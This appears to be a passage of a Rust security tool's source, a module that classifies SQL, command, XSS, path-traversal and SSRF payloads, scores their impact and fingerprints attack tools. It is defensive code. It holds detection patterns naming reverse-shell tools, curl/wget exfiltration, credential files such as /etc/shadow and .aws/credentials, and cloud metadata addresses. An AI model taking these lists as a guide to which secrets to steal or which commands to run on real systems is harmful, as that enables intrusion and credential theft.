//! Effect Simulator — Computational Proof of Exploit Impact
//!
//! CrowdStrike: "SQL injection detected" (after the breach)
//! INVARIANT: "This payload, injected into a WHERE clause, causes the query
//!   to return ALL rows (tautological condition). Impact: full table extraction.
//!   Proof: eval('1'='1') → TRUE ∀ rows. QED."
//!
//! This module SIMULATES what would happen if the attack payload reached
//! its intended execution context. It produces:
//!   1. A concrete description of what the payload DOES
//!   2. A formal proof of WHY it works
//!   3. An impact assessment (CIA triad + CVSS-like score)
//!   4. The minimum conditions required for the exploit to succeed
//!
//! Simulation domains: SQL, XSS, CMD, Path, SSRF

use std::net::Ipv4Addr;

// ── Effect Types ──────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct ExploitEffect {
    pub operation: ExploitOperation,
    pub proof: ExploitProof,
    pub impact: ImpactAssessment,
    pub preconditions: Vec<String>,
    pub chain: Vec<ExploitStep>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExploitOperation {
    BypassAuthentication,
    ExtractAllRows,
    ExtractSpecificColumns,
    ModifyData,
    DeleteData,
    ExecuteSystemCommand,
    ReadFile,
    WriteFile,
    EstablishOutboundConnection,
    ExecuteJavascript,
    StealCredentials,
    RedirectUser,
    AccessInternalService,
    ElevatePrivileges,
    CauseDenialOfService,
    UnknownEffect,
}

#[derive(Debug, Clone)]
pub struct ExploitProof {
    pub statement: String,
    pub derivation: Vec<String>,
    pub is_complete: bool,
    pub certainty: f64,
}

#[derive(Debug, Clone)]
pub struct ImpactAssessment {
    pub confidentiality: f64,
    pub integrity: f64,
    pub availability: f64,
    pub exposure_estimate: String,
    pub base_score: f64,
}

#[derive(Debug, Clone)]
pub struct ExploitStep {
    pub step: usize,
    pub description: String,
    pub output: String,
}

// ── SQL Effect Simulation ─────────────────────────────────────────

#[derive(Debug)]
enum SqlMechanismType {
    StringEscape,
    NumericInjection,
    StackedQuery,
    UnionInjection,
    CommentTruncation,
    BooleanBlind,
    TimeBlind,
    ErrorBased,
}

struct SqlMechanism {
    mtype: SqlMechanismType,
    detail: String,
    evidence: String,
}

fn identify_sql_mechanism(payload: &str) -> SqlMechanism {
    let lower = payload.to_lowercase();

    if payload.starts_with('\'')
        || payload.starts_with('"')
        || (payload.contains('\'')
            && (lower.contains(" or ")
                || lower.contains(" and ")
                || lower.contains("union")
                || payload.contains(';')))
    {
        return SqlMechanism {
            mtype: SqlMechanismType::StringEscape,
            detail: "Terminates string literal to inject SQL".into(),
            evidence: format!(
                "String delimiter found at position {}",
                payload.find(|c: char| c == '\'' || c == '"').unwrap_or(0)
            ),
        };
    }
    if lower.contains("union") && lower.contains("select") {
        return SqlMechanism {
            mtype: SqlMechanismType::UnionInjection,
            detail: "Appends UNION SELECT to extract additional data".into(),
            evidence: "UNION SELECT clause detected".into(),
        };
    }
    if payload.contains(';')
        && (lower.contains("select")
            || lower.contains("insert")
            || lower.contains("update")
            || lower.contains("delete")
            || lower.contains("drop")
            || lower.contains("exec"))
    {
        return SqlMechanism {
            mtype: SqlMechanismType::StackedQuery,
            detail: "Terminates original query and executes new statement".into(),
            evidence: "Semicolon followed by SQL keyword".into(),
        };
    }
    if lower.contains("sleep")
        || lower.contains("waitfor delay")
        || lower.contains("pg_sleep")
        || lower.contains("benchmark")
    {
        return SqlMechanism {
            mtype: SqlMechanismType::TimeBlind,
            detail: "Uses time delay to extract data bit-by-bit".into(),
            evidence: "Time function detected".into(),
        };
    }
    if lower.contains("extractvalue")
        || lower.contains("xmltype")
        || lower.contains("updatexml")
        || lower.contains("convert(")
    {
        return SqlMechanism {
            mtype: SqlMechanismType::ErrorBased,
            detail: "Forces database error to leak data in error message".into(),
            evidence: "Error-forcing function detected".into(),
        };
    }
    if payload.ends_with("--") || payload.ends_with('#') || payload.contains("/*") {
        return SqlMechanism {
            mtype: SqlMechanismType::CommentTruncation,
            detail: "Truncates remaining query via comment".into(),
            evidence: "SQL comment sequence at end of input".into(),
        };
    }

    SqlMechanism {
        mtype: SqlMechanismType::BooleanBlind,
        detail: "Injects boolean condition for blind extraction".into(),
        evidence: "Boolean operator detected in input".into(),
    }
}

fn determine_sql_effect(payload: &str, mechanism: &SqlMechanism) -> (ExploitOperation, String) {
    let lower = payload.to_lowercase();

    if lower.contains("into outfile") || lower.contains("into dumpfile") {
        return (
            ExploitOperation::WriteFile,
            "Writes file to disk — may establish webshell".into(),
        );
    }
    if lower.contains("xp_cmdshell") || lower.contains("load_file") {
        return (
            ExploitOperation::ExecuteSystemCommand,
            "Executes OS command via SQL server stored procedure".into(),
        );
    }
    if lower.contains("union") && lower.contains("select") {
        let has_cred_cols = [
            "password", "passwd", "pwd", "hash", "token", "secret", "key", "ssn",
        ]
        .iter()
        .any(|c| lower.contains(c));
        if has_cred_cols {
            return (
                ExploitOperation::StealCredentials,
                "Extracts credential columns via UNION injection".into(),
            );
        }
        return (
            ExploitOperation::ExtractSpecificColumns,
            "Extracts columns via UNION injection".into(),
        );
    }
    if lower.contains("drop table") || lower.contains("delete from") || lower.contains("truncate") {
        return (
            ExploitOperation::DeleteData,
            "Destroys table data — irrecoverable without backup".into(),
        );
    }
    if lower.contains("update") && lower.contains("set") {
        return (
            ExploitOperation::ModifyData,
            "Modifies data in target table".into(),
        );
    }
    if lower.contains("sleep")
        || lower.contains("benchmark")
        || lower.contains("waitfor")
        || lower.contains("pg_sleep")
    {
        return (
            ExploitOperation::CauseDenialOfService,
            "Time-based blind injection — delays response per row".into(),
        );
    }
    if lower.contains("information_schema")
        || lower.contains("pg_catalog")
        || lower.contains("sqlite_master")
    {
        return (
            ExploitOperation::ExtractSpecificColumns,
            "Enumerates database schema".into(),
        );
    }
    if lower.contains(" or ") {
        return (
            ExploitOperation::BypassAuthentication,
            "Tautological condition bypasses WHERE clause — returns ALL rows".into(),
        );
    }

    (
        ExploitOperation::UnknownEffect,
        format!("SQL injection via {:?}", mechanism.mtype),
    )
}

fn compute_sql_impact(operation: ExploitOperation) -> ImpactAssessment {
    match operation {
        ExploitOperation::BypassAuthentication | ExploitOperation::ExtractAllRows => {
            ImpactAssessment {
                confidentiality: 0.9,
                integrity: 0.1,
                availability: 0.0,
                exposure_estimate: "Full table contents (all rows)".into(),
                base_score: 8.6,
            }
        }
        ExploitOperation::StealCredentials => ImpactAssessment {
            confidentiality: 1.0,
            integrity: 0.3,
            availability: 0.1,
            exposure_estimate: "Credential columns (passwords, tokens, keys)".into(),
            base_score: 9.8,
        },
        ExploitOperation::ExtractSpecificColumns => ImpactAssessment {
            confidentiality: 0.7,
            integrity: 0.0,
            availability: 0.0,
            exposure_estimate: "Selected columns from targeted table".into(),
            base_score: 7.5,
        },
        ExploitOperation::DeleteData => ImpactAssessment {
            confidentiality: 0.0,
            integrity: 0.9,
            availability: 0.9,
            exposure_estimate: "Table destruction — data loss unless backup exists".into(),
            base_score: 9.1,
        },
        ExploitOperation::ModifyData => ImpactAssessment {
            confidentiality: 0.0,
            integrity: 0.8,
            availability: 0.2,
            exposure_estimate: "Data modification in target table".into(),
            base_score: 7.0,
        },
        ExploitOperation::WriteFile => ImpactAssessment {
            confidentiality: 0.2,
            integrity: 0.9,
            availability: 0.3,
            exposure_estimate: "Arbitrary file write — potential webshell".into(),
            base_score: 9.0,
        },
        ExploitOperation::ExecuteSystemCommand => ImpactAssessment {
            confidentiality: 1.0,
            integrity: 1.0,
            availability: 1.0,
            exposure_estimate: "Full system compromise — OS command execution".into(),
            base_score: 10.0,
        },
        ExploitOperation::CauseDenialOfService => ImpactAssessment {
            confidentiality: 0.0,
            integrity: 0.0,
            availability: 0.7,
            exposure_estimate: "Time-based delay per row evaluation".into(),
            base_score: 5.3,
        },
        _ => ImpactAssessment {
            confidentiality: 0.5,
            integrity: 0.3,
            availability: 0.1,
            exposure_estimate: "Impact depends on application context".into(),
            base_score: 5.0,
        },
    }
}

/// Simulate the effect of a SQL injection payload.
pub fn simulate_sql_effect(payload: &str, query_template: Option<&str>) -> ExploitEffect {
    let mut chain = Vec::new();
    let mut preconditions = Vec::new();
    let mut derivation = Vec::new();

    let mechanism = identify_sql_mechanism(payload);
    chain.push(ExploitStep {
        step: 1,
        description: format!("Injection mechanism: {:?}", mechanism.mtype),
        output: mechanism.detail.clone(),
    });
    derivation.push(format!(
        "Input contains {:?}: {}",
        mechanism.mtype, mechanism.evidence
    ));

    let (operation, detail) = determine_sql_effect(payload, &mechanism);
    chain.push(ExploitStep {
        step: 2,
        description: format!("Payload effect: {:?}", operation),
        output: detail.clone(),
    });

    if let Some(template) = query_template {
        preconditions.push("Input reaches SQL query without parameterization".into());
        preconditions.push(format!("Query template: {}", template));
        derivation.push(format!("Original query: {}", template));
        derivation.push(format!("Injected payload: {}", payload));
    } else {
        preconditions.push("Input reaches a SQL query context".into());
        preconditions.push("Query uses string concatenation (not parameterized)".into());
    }

    // Tautology proof
    let lower = payload.to_lowercase();
    let has_tautology = lower.contains(" or 1=1")
        || lower.contains(" or '1'='1'")
        || lower.contains(" or 'a'='a'")
        || lower.contains(" or true");
    let (certainty, is_complete) = if has_tautology {
        derivation.push(
            "Tautological condition proven: expression evaluates to TRUE for all rows".into(),
        );
        chain.push(ExploitStep {
            step: chain.len() + 1,
            description: "Tautology proven".into(),
            output: "∀ row: eval(condition) = TRUE".into(),
        });
        (0.99, true)
    } else {
        (0.85, false)
    };

    let impact = compute_sql_impact(operation);

    ExploitEffect {
        operation,
        proof: ExploitProof {
            statement: format!(
                "Effect: {}. {:?} confirmed by structural analysis.",
                detail, mechanism.mtype
            ),
            derivation,
            is_complete,
            certainty,
        },
        impact,
        preconditions,
        chain,
    }
}

// ── CMD Effect Simulation ─────────────────────────────────────────

fn split_shell_commands(payload: &str) -> Vec<String> {
    let mut commands = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let chars: Vec<char> = payload.chars().collect();
    let len = chars.len();
    let mut i = 0;

    while i < len {
        let ch = chars[i];
        if ch == '\'' && !in_double {
            in_single = !in_single;
            current.push(ch);
            i += 1;
            continue;
        }
        if ch == '"' && !in_single {
            in_double = !in_double;
            current.push(ch);
            i += 1;
            continue;
        }

        if !in_single && !in_double {
            if ch == ';' || ch == '\n' {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    commands.push(trimmed);
                }
                current.clear();
                i += 1;
                continue;
            }
            if ch == '|' && i + 1 < len && chars[i + 1] == '|' {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    commands.push(trimmed);
                }
                current.clear();
                i += 2;
                continue;
            }
            if ch == '&' && i + 1 < len && chars[i + 1] == '&' {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    commands.push(trimmed);
                }
                current.clear();
                i += 2;
                continue;
            }
            if ch == '|' && (i + 1 >= len || chars[i + 1] != '|') {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    commands.push(trimmed);
                }
                current.clear();
                i += 1;
                continue;
            }
        }
        current.push(ch);
        i += 1;
    }
    let trimmed = current.trim().to_string();
    if !trimmed.is_empty() {
        commands.push(trimmed);
    }
    commands
}

fn analyze_shell_command(cmd: &str) -> (ExploitOperation, String, String, u8) {
    let lower = cmd.to_lowercase();
    let parts: Vec<&str> = lower.split_whitespace().collect();
    let binary = parts
        .first()
        .map(|p| p.rsplit('/').next().unwrap_or(p))
        .unwrap_or("");

    // Reverse shell
    if lower.contains("/dev/tcp")
        || lower.contains("nc -")
        || lower.contains("ncat ")
        || lower.contains("netcat ")
        || lower.contains("socat ")
        || lower.contains("mkfifo")
    {
        return (
            ExploitOperation::EstablishOutboundConnection,
            "Reverse shell establishment".into(),
            "Persistent remote shell access".into(),
            10,
        );
    }

    // File read
    if [
        "cat", "head", "tail", "less", "more", "tac", "strings", "xxd",
    ]
    .contains(&binary)
    {
        let target = parts[1..].join(" ");
        let is_cred = [
            "passwd", "shadow", ".ssh", "id_rsa", ".env", ".aws", ".docker", "config", "token",
            "key", "secret",
        ]
        .iter()
        .any(|p| target.contains(p));
        if is_cred {
            return (
                ExploitOperation::StealCredentials,
                format!("Read credential file: {}", target),
                format!("Credential file exposure: {}", target),
                9,
            );
        }
        return (
            ExploitOperation::ReadFile,
            format!("Read file: {}", target),
            format!("File contents disclosed: {}", target),
            6,
        );
    }

    // Destructive
    if ["rm", "shred", "wipe"].contains(&binary) || binary.starts_with("mkfs") {
        return (
            ExploitOperation::DeleteData,
            format!("Destructive operation: {}", cmd),
            "Data destruction".into(),
            8,
        );
    }

    // Privilege escalation
    if ["sudo", "su", "chmod", "chown", "passwd", "usermod"].contains(&binary) {
        return (
            ExploitOperation::ElevatePrivileges,
            format!("Privilege escalation: {}", cmd),
            "May grant elevated permissions".into(),
            9,
        );
    }

    // Exfiltration
    if (binary == "curl" || binary == "wget")
        && (lower.contains(" -d") || lower.contains("--post") || lower.contains("--data"))
    {
        return (
            ExploitOperation::StealCredentials,
            format!("Data exfiltration via {}", binary),
            "Sends stolen data to attacker".into(),
            8,
        );
    }

    // File write
    if binary == "echo" && cmd.contains('>') {
        return (
            ExploitOperation::WriteFile,
            format!("File write: {}", cmd),
            "Creates or modifies file".into(),
            7,
        );
    }

    // Persistence
    if ["crontab", "at", "systemctl"].contains(&binary) || lower.contains("/etc/cron") {
        return (
            ExploitOperation::WriteFile,
            format!("Persistence: {}", cmd),
            "Recurring execution — survives reboot".into(),
            8,
        );
    }

    // System info
    if [
        "whoami", "id", "uname", "hostname", "ifconfig", "ip", "ps", "env",
    ]
    .contains(&binary)
    {
        return (
            ExploitOperation::ReadFile,
            format!("System enumeration: {}", cmd),
            "Discovers system configuration".into(),
            4,
        );
    }

    (
        ExploitOperation::ExecuteSystemCommand,
        format!("Execute: {}", cmd),
        "Arbitrary command execution".into(),
        5,
    )
}

/// Simulate the effect of a command injection payload.
pub fn simulate_cmd_effect(payload: &str) -> ExploitEffect {
    let commands = split_shell_commands(payload);
    let mut chain = Vec::new();
    let derivation: Vec<String> = Vec::new();
    let mut primary_op = ExploitOperation::ExecuteSystemCommand;
    let mut primary_detail = String::new();
    let mut max_severity = 0u8;

    for (i, cmd) in commands.iter().enumerate() {
        let (op, desc, effect, severity) = analyze_shell_command(cmd);
        chain.push(ExploitStep {
            step: i + 1,
            description: desc.clone(),
            output: effect,
        });
        if severity > max_severity {
            max_severity = severity;
            primary_op = op;
            primary_detail = desc;
        }
    }

    if primary_detail.is_empty() {
        primary_detail = format!("Executes {} shell command(s)", commands.len());
    }

    let impact = match primary_op {
        ExploitOperation::EstablishOutboundConnection => ImpactAssessment {
            confidentiality: 1.0,
            integrity: 1.0,
            availability: 0.5,
            exposure_estimate: "Full system compromise via reverse shell".into(),
            base_score: 10.0,
        },
        ExploitOperation::StealCredentials => ImpactAssessment {
            confidentiality: 1.0,
            integrity: 0.2,
            availability: 0.0,
            exposure_estimate: "Credential files read and potentially exfiltrated".into(),
            base_score: 9.1,
        },
        ExploitOperation::DeleteData => ImpactAssessment {
            confidentiality: 0.0,
            integrity: 1.0,
            availability: 1.0,
            exposure_estimate: "Data destruction on target system".into(),
            base_score: 9.1,
        },
        ExploitOperation::ElevatePrivileges => ImpactAssessment {
            confidentiality: 0.8,
            integrity: 0.9,
            availability: 0.5,
            exposure_estimate: "Elevated from application user to system admin".into(),
            base_score: 8.8,
        },
        _ => ImpactAssessment {
            confidentiality: 0.7,
            integrity: 0.7,
            availability: 0.3,
            exposure_estimate: "Arbitrary command execution with application privileges".into(),
            base_score: 7.5,
        },
    };

    ExploitEffect {
        operation: primary_op,
        proof: ExploitProof {
            statement: format!(
                "Shell injection: {} command(s). Primary: {}",
                commands.len(),
                primary_detail
            ),
            derivation,
            is_complete: true,
            certainty: 0.95,
        },
        impact,
        preconditions: vec!["Input reaches shell execution context (exec/spawn/system)".into()],
        chain,
    }
}

// ── XSS Effect Simulation ─────────────────────────────────────────

/// Simulate the effect of a Cross-Site Scripting payload.
pub fn simulate_xss_effect(payload: &str) -> ExploitEffect {
    let mut chain = Vec::new();
    let mut preconditions = vec!["Input rendered in HTML response without encoding".to_string()];
    let mut derivation: Vec<String> = Vec::new();

    let lower = payload.to_lowercase();

    // Mechanism
    let mechanism = if lower.contains("<script") {
        derivation.push("Injection via <script> tag — direct JavaScript execution".into());
        "inline_script_tag"
    } else if lower.contains("on") && payload.contains('=') {
        derivation.push("Injection via event handler attribute".into());
        "event_handler"
    } else if lower.contains("javascript:") {
        derivation.push("Injection via javascript: protocol".into());
        "protocol_handler"
    } else {
        derivation.push("XSS payload detected".into());
        "html_tag_injection"
    };

    chain.push(ExploitStep {
        step: 1,
        description: format!("XSS mechanism: {}", mechanism),
        output: derivation[0].clone(),
    });

    // Determine effect
    let (operation, detail) = if lower.contains("document.cookie") || lower.contains(".cookie") {
        preconditions.push("HttpOnly flag not set on session cookies".into());
        (
            ExploitOperation::StealCredentials,
            "Exfiltrates session cookies — enables session hijacking",
        )
    } else if lower.contains("localstorage") || lower.contains("sessionstorage") {
        (
            ExploitOperation::StealCredentials,
            "Exfiltrates browser storage — may contain tokens, PII",
        )
    } else if lower.contains("location")
        && (lower.contains("href") || lower.contains("replace") || lower.contains("="))
    {
        (
            ExploitOperation::RedirectUser,
            "Redirects victim to attacker-controlled page",
        )
    } else if lower.contains("fetch(")
        || lower.contains("xmlhttprequest")
        || lower.contains("sendbeacon")
    {
        (
            ExploitOperation::EstablishOutboundConnection,
            "Cross-origin requests from victim browser context",
        )
    } else {
        (
            ExploitOperation::ExecuteJavascript,
            "Arbitrary JavaScript execution in victim browser",
        )
    };

    chain.push(ExploitStep {
        step: 2,
        description: format!("XSS effect: {:?}", operation),
        output: detail.to_string(),
    });

    let impact = match operation {
        ExploitOperation::StealCredentials => ImpactAssessment {
            confidentiality: 0.9,
            integrity: 0.3,
            availability: 0.0,
            exposure_estimate: "Session tokens/credentials exfiltrated from every victim".into(),
            base_score: 8.1,
        },
        ExploitOperation::RedirectUser => ImpactAssessment {
            confidentiality: 0.5,
            integrity: 0.5,
            availability: 0.3,
            exposure_estimate: "Victims redirected to phishing page".into(),
            base_score: 6.5,
        },
        _ => ImpactAssessment {
            confidentiality: 0.5,
            integrity: 0.5,
            availability: 0.2,
            exposure_estimate: "Arbitrary JavaScript execution in victim browser".into(),
            base_score: 6.1,
        },
    };

    ExploitEffect {
        operation,
        proof: ExploitProof {
            statement: format!("XSS payload via {}: {}", mechanism, detail),
            derivation,
            is_complete: mechanism != "unknown",
            certainty: if mechanism != "unknown" { 0.90 } else { 0.60 },
        },
        impact,
        preconditions,
        chain,
    }
}

// ── Path Traversal Effect Simulation ──────────────────────────────

/// Simulate the effect of a path traversal payload.
pub fn simulate_path_effect(payload: &str) -> ExploitEffect {
    let mut chain = Vec::new();
    let mut preconditions = vec!["User input used in file path without sanitization".to_string()];
    let mut derivation = Vec::new();

    let dotdot_count =
        payload.matches("../").count() + payload.to_lowercase().matches("%2e%2e%2f").count();
    chain.push(ExploitStep {
        step: 1,
        description: format!("Traversal depth: {} directories up", dotdot_count),
        output: format!("Escapes {} directory levels", dotdot_count),
    });
    derivation.push(format!("Path contains {} '../' sequences", dotdot_count));

    // Target file
    let target = payload
        .replace("../", "")
        .replace("..\\", "")
        .replace("%2e%2e%2f", "")
        .replace("%2e%2e/", "")
        .replace('\0', "")
        .replace("%00", "");
    chain.push(ExploitStep {
        step: 2,
        description: format!("Target file: {}", &target),
        output: format!("Resolves to /{}", &target),
    });
    derivation.push(format!("Target path resolves to: /{}", &target));

    let sensitive_files: &[(&str, ExploitOperation, &str, f64)] = &[
        (
            "etc/passwd",
            ExploitOperation::StealCredentials,
            "System user enumeration",
            7.5,
        ),
        (
            "etc/shadow",
            ExploitOperation::StealCredentials,
            "Password hash extraction",
            9.8,
        ),
        (
            ".env",
            ExploitOperation::StealCredentials,
            "Environment secrets — API keys, DB passwords",
            9.5,
        ),
        (
            ".git/config",
            ExploitOperation::StealCredentials,
            "Git credentials",
            7.0,
        ),
        (
            ".ssh/id_rsa",
            ExploitOperation::StealCredentials,
            "Private SSH key — lateral movement",
            9.8,
        ),
        (
            ".aws/credentials",
            ExploitOperation::StealCredentials,
            "AWS access keys — full cloud compromise",
            10.0,
        ),
        (
            "wp-config.php",
            ExploitOperation::StealCredentials,
            "WordPress DB credentials + salts",
            9.0,
        ),
        (
            "proc/self/environ",
            ExploitOperation::StealCredentials,
            "Process environment — runtime secrets",
            8.5,
        ),
    ];

    let target_lower = target.to_lowercase().replace('\\', "/");
    let mut operation = ExploitOperation::ReadFile;
    let mut detail = format!("Reads arbitrary file: /{}", target);
    let mut base_score = 5.5;

    for (path, op, desc, score) in sensitive_files {
        if target_lower.contains(path) {
            operation = *op;
            detail = desc.to_string();
            base_score = *score;
            chain.push(ExploitStep {
                step: 3,
                description: format!("Sensitive file: {}", path),
                output: desc.to_string(),
            });
            derivation.push(format!("Target matches sensitive file: {}", path));
            break;
        }
    }

    if payload.contains('\0') || payload.contains("%00") {
        preconditions.push("Null byte terminates path before extension check".into());
        derivation.push("Null byte injection bypasses file extension validation".into());
        base_score = (base_score + 0.5).min(10.0);
    }

    let confidentiality = if operation == ExploitOperation::StealCredentials {
        1.0
    } else {
        0.6
    };

    ExploitEffect {
        operation,
        proof: ExploitProof {
            statement: format!("Path traversal to /{}: {}", target, detail),
            derivation,
            is_complete: dotdot_count > 0,
            certainty: if dotdot_count > 0 { 0.85 } else { 0.50 },
        },
        impact: ImpactAssessment {
            confidentiality,
            integrity: 0.0,
            availability: 0.0,
            exposure_estimate: detail,
            base_score,
        },
        preconditions,
        chain,
    }
}

// ── SSRF Effect Simulation ────────────────────────────────────────

/// Simulate the effect of a Server-Side Request Forgery payload.
pub fn simulate_ssrf_effect(payload: &str) -> ExploitEffect {
    let mut chain = Vec::new();
    let preconditions = vec!["User input used in server-side HTTP request URL".to_string()];
    let mut derivation = Vec::new();

    let lower = payload.to_lowercase();

    // Parse target
    let (target_host_raw, target_port, target_path) = parse_url_target(payload);
    let target_host = normalize_host(&target_host_raw);
    chain.push(ExploitStep {
        step: 1,
        description: format!(
            "Target: {}{}{}",
            target_host,
            if target_port.is_empty() {
                "".to_string()
            } else {
                format!(":{}", target_port)
            },
            target_path
        ),
        output: "SSRF target resolved".into(),
    });
    derivation.push(format!("Target host: {}", target_host));

    let (operation, detail, base_score) = if is_cloud_metadata_host(&target_host)
        || lower.contains("/latest/meta-data")
        || lower.contains("/computemetadata")
    {
        derivation.push("Target is cloud metadata endpoint — exposes IAM credentials".into());
        chain.push(ExploitStep {
            step: 2,
            description: "Cloud metadata access".into(),
            output: "IAM credentials, instance metadata exposed".into(),
        });
        (
            ExploitOperation::StealCredentials,
            "Cloud metadata service — extracts IAM credentials".to_string(),
            9.5,
        )
    } else if is_internal_ip(&target_host) {
        let db_ports = [
            ("6379", "Redis"),
            ("27017", "MongoDB"),
            ("5432", "PostgreSQL"),
            ("3306", "MySQL"),
            ("11211", "Memcached"),
        ];
        let db = db_ports.iter().find(|(p, _)| *p == target_port);
        if let Some((_, name)) = db {
            derivation.push(format!(
                "Internal {} at {}:{}",
                name, target_host, target_port
            ));
            (
                ExploitOperation::AccessInternalService,
                format!(
                    "Accesses internal {} at {}:{}",
                    name, target_host, target_port
                ),
                8.8,
            )
        } else {
            derivation.push(format!("Internal network target: {}", target_host));
            (
                ExploitOperation::AccessInternalService,
                format!("Internal network access: {}", target_host),
                6.5,
            )
        }
    } else if lower.starts_with("file://") {
        let file_path = &payload[7..];
        derivation.push(format!("File protocol access: {}", file_path));
        (
            ExploitOperation::ReadFile,
            format!("Reads local file via file:// protocol: {}", file_path),
            8.0,
        )
    } else {
        (
            ExploitOperation::AccessInternalService,
            format!("Accesses service at {}", target_host),
            7.0,
        )
    };

    let confidentiality = if operation == ExploitOperation::StealCredentials {
        1.0
    } else {
        0.7
    };

    ExploitEffect {
        operation,
        proof: ExploitProof {
            statement: format!("SSRF to {}: {}", target_host, detail),
            derivation,
            is_complete: target_host != "unknown",
            certainty: if target_host != "unknown" { 0.85 } else { 0.50 },
        },
        impact: ImpactAssessment {
            confidentiality,
            integrity: 0.2,
            availability: 0.1,
            exposure_estimate: detail,
            base_score,
        },
        preconditions,
        chain,
    }
}

fn parse_url_target(payload: &str) -> (String, String, String) {
    let s = if let Some((_, rest)) = payload.split_once("://") {
        rest
    } else {
        payload
    };
    let (authority, path) = s
        .split_once('/')
        .map(|(a, p)| (a, format!("/{}", p)))
        .unwrap_or((s, "/".to_string()));
    let authority = authority.rsplit('@').next().unwrap_or(authority);

    if authority.starts_with('[') {
        if let Some(end) = authority.find(']') {
            let host = authority[..=end].to_string();
            let port = authority[end + 1..]
                .strip_prefix(':')
                .map(|p| p.to_string())
                .unwrap_or_default();
            return (host, port, path);
        }
    }

    let (host, port) = authority
        .split_once(':')
        .map(|(h, p)| (h.to_string(), p.to_string()))
        .unwrap_or((authority.to_string(), String::new()));
    (host, port, path)
}

fn is_internal_ip(host: &str) -> bool {
    let normalized = normalize_host(host);
    if normalized == "localhost"
        || normalized == "::1"
        || normalized.starts_with("fc")
        || normalized.starts_with("fd")
        || normalized.starts_with("fe80:")
    {
        return true;
    }

    if let Some(ip) = parse_ipv4_like(&normalized) {
        let [a, b, _, _] = ip.octets();
        return a == 10
            || (a == 172 && (16..=31).contains(&b))
            || (a == 192 && b == 168)
            || a == 127
            || (a == 169 && b == 254);
    }
    false
}

fn parse_ipv4_like(host: &str) -> Option<Ipv4Addr> {
    if let Ok(ip) = host.parse::<Ipv4Addr>() {
        return Some(ip);
    }
    if host.chars().all(|c| c.is_ascii_digit()) {
        if let Ok(v) = host.parse::<u32>() {
            return Some(Ipv4Addr::from(v));
        }
    }
    if host.starts_with("0x") && host[2..].chars().all(|c| c.is_ascii_hexdigit()) {
        if let Ok(v) = u32::from_str_radix(&host[2..], 16) {
            return Some(Ipv4Addr::from(v));
        }
    }
    None
}

fn percent_decode_once(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = String::with_capacity(input.len());
    let mut i = 0usize;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            let h1 = bytes[i + 1] as char;
            let h2 = bytes[i + 2] as char;
            let hs = [h1, h2].iter().collect::<String>();
            if let Ok(v) = u8::from_str_radix(&hs, 16) {
                out.push(v as char);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i] as char);
        i += 1;
    }
    out
}

fn normalize_host(host: &str) -> String {
    let mut h = percent_decode_once(host.trim()).trim().to_lowercase();
    if let Some(idx) = h.rfind('@') {
        h = h[idx + 1..].to_string();
    }
    if h.starts_with('[') && h.ends_with(']') && h.len() > 2 {
        h = h[1..h.len() - 1].to_string();
    }
    h.trim_end_matches('.').to_string()
}

fn is_cloud_metadata_host(host: &str) -> bool {
    let h = normalize_host(host);
    if h == "metadata.google" || h == "metadata.google.internal" {
        return true;
    }
    if let Some(ip) = parse_ipv4_like(&h) {
        let oct = ip.octets();
        return oct == [169, 254, 169, 254] || oct == [100, 100, 100, 200];
    }
    false
}

// ── Adversary Fingerprinting ──────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SkillLevel {
    ScriptKiddie,
    Intermediate,
    Advanced,
    Expert,
}

#[derive(Debug, Clone)]
pub struct AdversaryFingerprint {
    pub tool: String,
    pub confidence: f64,
    pub indicators: Vec<String>,
    pub skill_level: SkillLevel,
    pub automated: bool,
}

/// Identify the likely tool or technique used to generate a payload.
pub fn fingerprint_adversary(
    payload: &str,
    detected_classes: &[crate::types::InvariantClass],
) -> AdversaryFingerprint {
    let mut indicators = Vec::new();
    let mut tool = "manual".to_string();
    let mut confidence = 0.3_f64;
    let mut skill_level = SkillLevel::Intermediate;
    let mut automated = false;
    let lower = payload.to_lowercase();

    // SQLMap fingerprints
    if payload.ends_with("--+") || payload.ends_with("-- ") {
        indicators.push("SQLMap-style comment: --+".into());
        tool = "sqlmap".into();
        confidence += 0.25;
        automated = true;
    }
    if lower.contains("and ") && payload.chars().filter(|c| c.is_ascii_digit()).count() > 6 {
        let has_eq = payload.contains("=");
        if has_eq && (lower.contains("union") || lower.contains(" and ")) {
            indicators.push("SQLMap boolean probe pattern".into());
            tool = "sqlmap".into();
            confidence += 0.20;
            automated = true;
        }
    }
    if payload.contains("0x") && lower.contains("union") {
        indicators.push("Hex-encoded strings (SQLMap concat technique)".into());
        tool = "sqlmap".into();
        confidence += 0.15;
        automated = true;
    }
    if lower.contains("sleep(") && lower.contains("benchmark(") {
        indicators.push("Stacked time-based probes (SQLMap tamper profile)".into());
        tool = "sqlmap".into();
        confidence += 0.15;
        automated = true;
    }

    // XSS tool fingerprints
    if lower.contains("<svg") && lower.contains("onload") {
        indicators.push("SVG onload — common in XSS tool payloads".into());
        if tool == "manual" {
            tool = "xss_tool".into();
            confidence += 0.15;
        }
        automated = true;
    }

    // Scanner fingerprints
    if payload.contains('§') {
        indicators.push("Burp Intruder marker (§) detected".into());
        tool = "burp_intruder".into();
        automated = true;
        confidence += 0.20;
    }
    if lower.contains("{{interactsh-url}}") || lower.contains("interactsh") {
        indicators.push("Nuclei/OAST marker (interactsh)".into());
        tool = "nuclei".into();
        automated = true;
        confidence += 0.20;
    }
    if lower.contains("${ifs}") || lower.contains("${::-") {
        indicators.push("Command obfuscation macro (${IFS}/${::-x})".into());
        tool = "commix_like".into();
        automated = true;
        skill_level = SkillLevel::Advanced;
        confidence += 0.15;
    }
    if detected_classes.len() >= 4 {
        indicators.push(format!(
            "High class diversity ({} classes) — automated scanning",
            detected_classes.len()
        ));
        automated = true;
        confidence += 0.10;
    }

    // Manual crafting indicators
    if !automated {
        if payload.contains("\\u00") || payload.contains("&#x") {
            indicators.push("Unicode/HTML entity obfuscation — manual or advanced tool".into());
